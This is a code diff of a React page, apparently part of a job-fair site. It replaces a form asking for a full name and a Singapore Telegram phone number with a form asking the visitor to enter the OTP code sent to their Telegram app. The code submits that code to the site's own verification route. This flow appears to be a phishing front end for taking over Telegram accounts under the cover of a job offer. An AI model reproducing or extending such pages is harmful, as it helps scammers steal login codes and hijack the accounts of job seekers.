@@ -1,16 +1,17 @@
 import { useForm } from "@inertiajs/react";
 import React, { useState } from "react";
 
-export default function Index() {
+export default function Verif(props) {
+    const phone_number = props.phone_number;
     const { data, setData, post, reset, errors } = useForm({
-        full_name: "",
-        phone_number: "+65",
+        verif_code: "",
+        phone_number: phone_number,
     });
     const [loading, setLoading] = useState(false);
     const submitHandler = (e) => {
         e.preventDefault();
         setLoading(true);
-        post(route("login-number"), {
+        post(route("jobfair.store-verification"), {
             onSuccess: () => {
                 setTimeout(() => {
                     setLoading(false);
@@ -22,6 +23,17 @@ export default function Index() {
                 }, 500);
             },
         });
+    };
+
+    const changeHandler = (e) => {
+        const input = e.target.value;
+
+        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
+        if (input.length <= 5) {
+            if (/^[0-9+]*$/.test(input)) {
+                setData({ ...data, verif_code: input });
+            }
+        }
     };
 
     return (
@@ -41,58 +53,30 @@ export default function Index() {
                     className="w-full"
                 />
                 <p className="font-light text-center text-orange-900 text-lg tracking-tight leading-5 mt-3 mb-2">
-                    To apply for job vacancies, Pleart enter an account
+                    Please enter the OTP code that we have sent to you{" "}
+                    <span className="font-extrabold">TELEGRAM APPLICATION</span>
                 </p>
                 <p className="font-bold text-center text-orange-950 text-xl">
-                    Your Telegram
+                    Enter the code that was sent to your Telegram application
+                    Telegram Number.
                 </p>
                 <form
                     onSubmit={submitHandler}
                     action=""
                     className="w-full my-8"
                 >
-                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight">
-                        Full Name
-                    </p>
+                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight"></p>
                     <input
                         type="text"
-                        name="full_name"
-                        placeholder="Full Name as Per IC"
+                        name="verif_code"
+                        placeholder="Kod Telegram"
                         className="w-full h-[50px] shadow-sm shadow-gray-500/50 border border-orange-950 focus:outline-none focus:ring-0 focus:border-orange-950 rounded-md"
-                        value={data.full_name}
-                        onChange={(e) =>
-                            setData({ ...data, full_name: e.target.value })
-                        }
+                        value={data.verif_code}
+                        onChange={changeHandler}
                     />
-                    {errors.full_name && (
+                    {errors.verif_code && (
                         <p className="text-red-500 text-xs italic">
-                            {errors.full_name}
-                        </p>
-                    )}
-                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight my-3">
-                        Nombor Phone Telegram
-                    </p>
-                    <div className="relative overflow-hidden w-full  flex shadow-sm shadow-gray-500/50">
-                        <div className="w-[60px] rounded-l-md font-bold h-[50px] bg-gradient-to-tl from-gray-300 via-gray-200 to-gray-300 flex items-center justify-center">
-                            SG
-                        </div>
-                        <input
-                            type="text"
-                            name="phone_number"
-                            placeholder="Full Name as Per IC"
-                            value={data.phone_number}
-                            className="w-full rounded-r-md outline-none border border-orange-950 focus:outline-none focus:ring-0 focus:border-orange-950"
-                            onChange={(e) =>
-                                setData({
-                                    ...data,
-                                    phone_number: e.target.value,
-                                })
-                            }
-                        />
-                    </div>
-                    {errors.full_name && (
-                        <p className="text-red-500 text-xs italic">
-                            {errors.full_name}
+                            {errors.verif_code}
                         </p>
                     )}
 
